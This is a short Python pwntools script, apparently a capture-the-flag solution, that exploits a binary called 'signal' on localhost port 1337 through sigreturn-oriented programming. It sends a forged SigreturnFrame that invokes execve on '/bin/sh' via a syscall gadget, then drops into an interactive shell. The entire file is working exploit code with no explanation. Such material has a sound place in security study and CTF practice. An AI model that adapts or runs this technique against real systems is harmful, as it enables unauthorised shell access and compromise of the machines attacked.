#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 1337

context(arch='amd64', os='linux')

io = remote(HOST, PORT)
#io = process('./container/signal')

frame = SigreturnFrame()
frame.rip = 0x400099 # syscall
frame.rax = constants.linux.SYS_execve
frame.rdi = 0x400080 # "/bin/sh"
frame.rsi = 0
frame.rdx = 0

io.send(bytes(frame))

io.interactive()
